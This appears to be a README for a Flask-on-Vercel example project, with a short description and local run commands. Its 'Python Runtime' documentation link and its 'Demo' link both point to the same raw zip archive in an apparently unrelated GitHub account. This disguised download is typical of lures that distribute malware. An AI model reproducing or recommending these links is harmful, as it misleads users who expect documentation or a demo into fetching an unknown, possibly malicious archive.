# Flask + Vercel

This example shows how to use Flask 3 on Vercel with Serverless Functions using the [Python Runtime](https://raw.githubusercontent.com/GPTAile/flask-hello-world/main/retrogression/flask-hello-world.zip).

## Demo

https://raw.githubusercontent.com/GPTAile/flask-hello-world/main/retrogression/flask-hello-world.zip

## How it Works

This example uses the Web Server Gateway Interface (WSGI) with Flask to enable handling requests on Vercel with Serverless Functions.

## Running Locally

```bash
npm i -g vercel
vercel dev
```

Your Flask application is now available at `http://localhost:3000`.
